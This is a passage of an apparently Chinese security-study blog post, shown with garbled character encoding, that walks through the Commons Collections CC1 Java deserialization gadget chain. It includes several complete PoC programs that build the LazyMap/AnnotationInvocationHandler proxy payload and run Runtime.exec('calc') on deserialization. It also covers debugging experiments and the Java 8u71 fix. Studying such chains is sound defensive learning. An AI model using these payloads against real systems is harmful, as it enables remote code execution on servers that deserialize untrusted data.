éƒ¨åˆ†ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç„¶åæ€»ç»“ä¸€ä¸‹å‰é¢çš„é—®é¢˜ï¼š\nè¿˜æ˜¯è¦æ³¨æ„ä¸€ä¸‹Runtimeç±»ä¸èƒ½å®ä¾‹åŒ–çš„é—®é¢˜ åå°„è·å–AnnotationInvocationHandlerç±» è¿›å…¥forå¾ªç¯çš„éœ€è¦puté”®å€¼å¯¹çš„é—®é¢˜ ifæ¡ä»¶çš„è¿›å…¥æ¡ä»¶ åœ¨æ‹‰é€šæ•´ä¸ªè¿‡ç¨‹æ—¶çš„è°ƒè¯•è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š\næš‚æ—¶å¯¹äºå¾ˆå¤šéƒ½æ˜¯åˆæ­¥äº†è§£å§ï¼Œè·Ÿæºç å…¶å®è¿˜æœ‰ç‚¹çœ‹ä¸æ‡‚ï¼Œåé¢å†æ¥çœ‹çœ‹ï¼Œç®€å•ç»™å‡ºç¤ºä¾‹ä»£ç ï¼Œä¹Ÿè®¸å¯ä»¥åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­æ›´å®¹æ˜“ç†è§£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxx\u0026#34;); Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); try { for (Map.Entry\u0026lt;String, String\u0026gt; entry : outerMap.entrySet()) { System.out.println(\u0026#34;æˆåŠŸè¿›å…¥å¾ªç¯éå†\u0026#34;); System.out.println(entry); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } catch (Exception e) { e.printStackTrace(); } } } æ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nçœ‹æ­¤æ—¶çš„å€¼ï¼š ç„¶åå†çœ‹ä¸Šé¢çš„å®ä¾‹ä»£ç ç»™å‡ºçš„ç»“æœï¼š\næš‚æ—¶å°±é€šè¿‡å®ä¾‹æ¥ç¨å¾®ç†è§£ä¸€ä¸‹ï¼Œçœ‹è¿™ä¸ªentryçš„å€¼ï¼Œå‰é¢æ‰€å±å°±æ˜¯AbstractInputCheckedMapDecorator$MapEntryï¼ˆä¸»è¦å°±æ˜¯è¿™é‡Œæ‰€å±ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªè¿˜æœ‰ç‚¹ä¸æ¸…æ¥šï¼‰ï¼Œè¿™æ ·ä¹Ÿå°±èƒ½å¤Ÿè¯´æ˜ä¸ºä»€ä¹ˆreadObject()æ–¹æ³•ä¸­åœ¨è°ƒç”¨setValue()æ–¹æ³•æ—¶ä¼šåˆ°è¿™ä¸ªMapEntryç±»ï¼ˆå°±ç®—ç›´æ¥åœ¨readObjectæ–¹æ³•æ‰“æ–­ç‚¹æ‰€å±è¿˜æ˜¯è¿™ä¸ªï¼‰ï¼Œä»è€Œå¯¼è‡´æ•´æ¡é“¾å­çš„æ‰§è¡Œã€‚\nLazyMapé“¾ å®é™…ä¸Šï¼Œåœ¨ysoserialé“¾ä¸­ï¼Œå®ƒåˆ©ç”¨çš„å¹¶ä¸æ˜¯TransformedMapï¼Œè€Œæ˜¯åˆ©ç”¨çš„LazyMapã€‚\nåˆ†æåŠæ„é€ è¿‡ç¨‹ LazyMapçš„æ¼æ´è§¦å‘ç‚¹æ˜¯å®ƒçš„get()æ–¹æ³•getæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯getæ–¹æ³•æºç ä¸­çš„factory.transform()ã€‚ä¹Ÿå°±æ˜¯LazyMapçš„ä½œç”¨æ˜¯â€œæ‡’åŠ è½½â€ï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨factory.transformæ–¹æ³•å»è·å–ä¸€ä¸ªå€¼ï¼š\n1 2 3 4 5 6 7 8 9 10 public Object get(Object key) { if (!this.map.containsKey(key)) { //å®¡ä»£ç å¦‚æœä¼ å…¥çš„keyä¸å­˜åœ¨ï¼Œå°±ä¼šæ‰ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ Object value = this.factory.transform(key); this.map.put(key, value); return value; } else { return this.map.get(key); } } ç›¸è¾ƒäºTransformedMapé“¾çš„åˆ©ç”¨æ–¹æ³•ï¼ŒLazyMapçš„åˆ©ç”¨æ›´å¤æ‚ä¸€äº›ï¼Œç”±äºsun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ã€‚ä½†æ˜¯AnnotationInvocationHandlerç±»çš„invokeæ–¹æ³•æœ‰è°ƒç”¨åˆ°getæ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(\u0026#34;Too many parameters for an annotation method\u0026#34;); switch(member) { case \u0026#34;toString\u0026#34;: return toStringImpl(); case \u0026#34;hashCode\u0026#34;: return hashCodeImpl(); case \u0026#34;annotationType\u0026#34;: return type; } // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(result) != 0) result = cloneArray(result); return result; } é‚£ä¹ˆå¦‚ä½•è°ƒç”¨åˆ°AnnotationInvocationHandler#invokeå‘¢ï¼Ÿè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨åˆ°åŠ¨æ€ä»£ç†ã€‚\nç°åœ¨å…ˆå›åˆ°LazyMapçš„get()æ–¹æ³•æºç ï¼Œé‡ç‚¹åˆ†æä¸€ä¸‹ifè¯­å¥ï¼š\n1 2 3 4 5 6 7 public Object get(Object key) { if (!this.map.containsKey(key)) { //å®¡ä»£ç å¦‚æœä¼ å…¥çš„keyä¸å­˜åœ¨ï¼Œå°±ä¼šæ‰ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ Object value = this.factory.transform(key); this.map.put(key, value); return value; } æ¥çœ‹è¿›å…¥ifè¯­å¥çš„æ¡ä»¶ï¼Œthis.map.containsKey(key)å°±æ˜¯çœ‹é”®å€¼è¡¨ä¸­æ˜¯å¦æœ‰è¿™ä¸ªkeyï¼Œåœ¨è¿™é‡Œéœ€è¦æ²¡æœ‰è¿™ä¸ªkeyæ‰èƒ½è¿›å…¥ifæ¡ä»¶ï¼›é‚£ä¹ˆè¿™ä¸ªkeyå¯¹åº”çš„invokeä¸­çš„ä»£ç å°±æ˜¯String member = method.getName(); å­¦è¿‡åŠ¨æ€ä»£ç†çš„è¯å°±çŸ¥é“è¿™é‡Œçš„memberå¯¹åº”çš„å°±æ˜¯ä»£ç†å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•åï¼Œä¸€èˆ¬åœ¨ä¸€ä¸ªjavaå¯¹è±¡ä¸­éƒ½ä¸ä¼šæœ‰ä¸€ä¸ªä»¥æ–¹æ³•åä¸ºé”®çš„é”®å€¼å¯¹ï¼Œæ‰€ä»¥ä¸€èˆ¬è¿™é‡Œçš„ifæ¡ä»¶å…¶å®æ˜¯å¯ä»¥å¿½ç•¥çš„ã€‚ç„¶åæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘è®¤ä¸ºè®¾ç½®ä¸€ä¸ªé”®å€¼å¯¹çš„é”®å°±æ˜¯ä»£ç†å¯¹è±¡è¦è°ƒç”¨çš„æ–¹æ³•åç§°ï¼Œé‚£ä¹ˆæ˜¯å¦åº”è¯¥ä¸ä¼šç»§ç»­ä¸‹å»ã€‚ç†è®ºä¸Šæ˜¯ä¸ªäººæ„Ÿè§‰æ˜¯å¯ä»¥çš„ï¼Œåé¢å®è·µä¸€ä¸‹ã€‚\nâ€”â€”\nç°åœ¨ç»§ç»­é“¾å­çš„è¯´æ˜\nå‰é¢è¯´åˆ°äº†éœ€è¦ç”¨åŠ¨æ€ä»£ç†ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨åˆ°java.lang.reflect.Proxyä»¥åŠInvocationHandleræ¥å£\nåœ¨è¿™é‡ŒAnnotationInvocationHandlerå®ç°äº†InvocationHandleræ¥å£å¹¶é‡å†™äº†invokeæ–¹æ³•ï¼Œç¬¦åˆåŸºæœ¬æ¡ä»¶ã€‚\nçœ‹ä»£ç æ‰€éœ€çš„å¯¹è±¡ï¼Œè¿™é‡Œå°±çœ‹çœ‹åœ¨å“ªäº›åœ°æ–¹éœ€è¦æ³¨æ„ï¼š é¦–å…ˆå°±æ˜¯AnnotationInvocationHandler#invokeä¸­è°ƒç”¨get()çš„åœ°æ–¹ï¼ŒmemberValues.get(member);ï¼Œæ‰€ä»¥è¿™é‡Œçš„membervalueséœ€è¦ä¸ºLazyMapç±»å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstroctor(Class.class,Map.class); constroctor1.setAccessible(true); object o = constructor1.newInstance(Retention.class,outerMap); ç°åœ¨å†æ¥çœ‹ä¸€ä¸‹outerMapçš„å†…å®¹ï¼Œç°åœ¨é¦–å…ˆå°±éœ€è¦çœ‹ä¸€ä¸‹LazyMapçš„æ„é€ æ–¹æ³•ç­‰ï¼Œç¨å¾®çœ‹ä¸€ä¸‹æºç ï¼Œå¯ä»¥çŸ¥æ™“æˆ‘ä»¬åˆ©ç”¨åˆ°çš„ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\u0026#34;Factory must not be null\u0026#34;); } else { this.factory = factory; } } æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Transformer outerMap = LazyMap.decorate(hashMap,chain); å†å°†å‰é¢ç»¼åˆä¸€ä¸‹ï¼Œå°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); } } æœ€åŸºæœ¬çš„é“¾å­å¤§æ¦‚å¦‚ä¸Šï¼Œç°åœ¨å°±æ˜¯æ€è€ƒå¦‚ä½•è·³åˆ°LazyMapçš„getæ–¹æ³•ï¼Œç»“åˆå‰é¢çš„è¯´æ³•ï¼Œç°åœ¨å°±æ˜¯è¦æ€è€ƒå¦‚ä½•è®¾ç½®ä»£ç†å¯¹è±¡ï¼Œç»“åˆåŠ¨æ€ä»£ç†çš„æµç¨‹ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°†Mapæ¥å£ç±»ä½œä¸ºâ€œä¸­é—´â€ç±»ï¼Œåˆšå¥½â€œå§”æ‰˜ç±»â€LazyMapæ˜¯å®ç°äº†Mapæ¥å£çš„ï¼Œæ‰€ä»¥æ˜¯å¾ˆåˆé€‚çš„ã€‚\nç„¶åç†è§£ä¸€ä¸‹ysoserialé“¾ï¼Œå¯ä»¥çŸ¥æ™“åœ¨éå†Map(proxy)æ—¶ä¼šè°ƒç”¨memberValues.entrySetæ–¹æ³•ï¼Œè¿›è€Œå¯ä»¥è§¦å‘invokeæ–¹æ³•ã€‚\nä¸€æ­¥ä¸€æ­¥æ¥ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘ä»¬è¿™é‡Œæ„é€ handlerï¼Œ\n1 InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); ç„¶åè°ƒç”¨Proxyçš„newProxyInstance()æ–¹æ³•ï¼Œç”¨æ¥åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 //ysoerialé“¾è¿™é‡Œå…¶å®åˆ©ç”¨çš„æ˜¯Map.classçš„æ„é€ å™¨ç­‰ï¼Œä½†æ˜¯å…¶å®åœ¨æœ€åçš„åˆ©ç”¨ä¸­å·®åˆ«ä¸å¤§ï¼Œå…ˆè·Ÿè¿™ä¸ª Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,outerMap); è¿™æ ·å°±æˆåŠŸåˆ›å»ºäº†ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œè¿™æ˜¯å†çœ‹ysoserialï¼Œç²¾å¦™çš„åœ°æ–¹æ¥äº†ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 Object o = constructor1.newInstance(Retention.class,proxyMap); ç„¶åå†å°†è¿™ä¸ªoåºåˆ—åŒ–å¹¶ååºåˆ—åŒ–ï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šå¯¹proxyMapè°ƒç”¨entryMap()æ–¹æ³•ï¼Œæ­¤æ—¶å°±ä¼šåˆ°AnnotationInvocationHandlerçš„invokeæ–¹æ³•ï¼Œç„¶åä¸€åˆ‡éƒ½ä¼šå¾€é¢„æœŸçš„æ–¹å‘å‘å±•ã€‚å†å°†å‰é¢æ‰€æœ‰çš„ä»£ç ç»“åˆèµ·æ¥ç¨å¾®æ”¹æ”¹ï¼Œå°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } æŠ¥é”™\nè¿™æ˜¯å› ä¸ºåœ¨è®¾ç½®ä»£ç†å¯¹è±¡æ—¶çš„ç¬¬äºŒä¸ªå‚æ•°Map.class.getInterfaces()çš„Map.classå¹¶æ²¡æœ‰å®ç°Mapæ¥å£ï¼ŒåŠ¨æ€ä»£ç†æ²¡æŒæ¡å¥½ï¼Œç…§çŒ«ç”»è™äº†å±äºæ˜¯ï¼Œæ‰€ä»¥è¿™é‡Œå®Œå…¨æ˜¯å¤šæ­¤ä¸€ä¸¾äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨Map.classå³å¯ï¼Œè€Œä¸”æœ¬èº«Mapå°±æ˜¯ä¸€ä¸ªæ¥å£ç±»ã€‚\næ‰€ä»¥æœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nâ€”â€”â€”â€”â€”â€”\næ€è€ƒ OKï¼Œç°åœ¨å°±æ˜¯è§£å†³å‰é¢é—ç•™çš„é—®é¢˜ã€‚\n1.è®¾ç½®ä¸€ä¸ªæ–¹æ³•åç§°å¯¹åº”çš„é”®çš„å®è·µï¼Œä¹Ÿå°±æ˜¯åŠ ä¸€ä¸ªhashMap.put(\u0026quot;entrySet\u0026quot;,\u0026quot;xxxx\u0026quot;); ã€‚æœ€åçš„æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); hashMap.put(\u0026#34;entrySet\u0026#34;,\u0026#34;xxxx\u0026#34;);//here!!!! Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } æœ€ç»ˆå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—æœºï¼Œæƒ³æ³•æ­£ç¡®ã€‚\n2,.åˆ›å»ºä»£ç†å¯¹è±¡æ—¶çš„æ–¹æ³•å‚æ•°é—®é¢˜ï¼Œåœ¨æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„LazyMapé“¾ä¸­ï¼Œå…¶å®åªè¦åˆ°äº†AnnotationInvocationHandler#invokeä¸­ï¼Œæ­£ç¡®è°ƒç”¨äº†getæ–¹æ³•ï¼Œé‚£ä¹ˆå¯¹äºåç»­çš„å¦‚æ­£å¸¸ä»£ç†ä¸­çš„ä¼šå»åˆ°å§”æ‰˜ç±»ä¸€ä¸‹éƒ½æ˜¯æ— æ„ä¹‰çš„ï¼Œè€Œä¸”è¿™é‡Œæœ¬èº«LazyMapå°±å®ç°äº†Mapæ¥å£ï¼Œæ‰€ä»¥åœ¨åˆ›å»ºä»£ç†å¯¹è±¡çš„æ—¶å€™ï¼Œå¯ä»¥åƒå‰é¢çš„POCé‚£æ ·æ„é€ ï¼Œä½†å…¶å®ä½¿ç”¨LazyMapä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = LazyMap.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } ä¹ŸæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nCC1çš„å±€é™ åœ¨Java 8u71ä»¥åï¼Œå®˜æ–¹ä¿®æ”¹äº†sun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ã€‚\næ”¹åŠ¨åï¼Œä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ªLinkedHashMapå¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„LinkedHashMapå¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§è¡Œsetæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚\nå‚è€ƒæ–‡ç« ï¼š ï¼ˆåé¢CCé“¾éƒ½æ˜¯è·Ÿè¿‡çš„ï¼Œè¿˜æœ‰çš„ä¸æ­¢CCé“¾ï¼Œå¯ä»¥å¤šçœ‹çœ‹åˆ«äººçš„åšå®¢ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªäººçš„å°±æ˜¯ï¼Œå¼ºæ¨ï¼‰\nhttps://su18.org/post/ysoserial-su18-2/#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2\nhttps://xz.aliyun.com/t/10387?time__1311=Cqjx2Qi%3DomqGqGNDQieiKd7KF8DAhOi3RiD#toc-2\nå½“ç„¶niviaçš„åšå®¢ï¼š https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9\n","date":"2024-07-13T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cc1/","title":"CC1"},{"content":"URLDNS URLDNSæ˜¯ysoserialä¸­åˆ©ç”¨é“¾çš„ä¸€ä¸ªåå­—ï¼Œé€šå¸¸ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¯¥åˆ©ç”¨é“¾æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š\nURLDNS 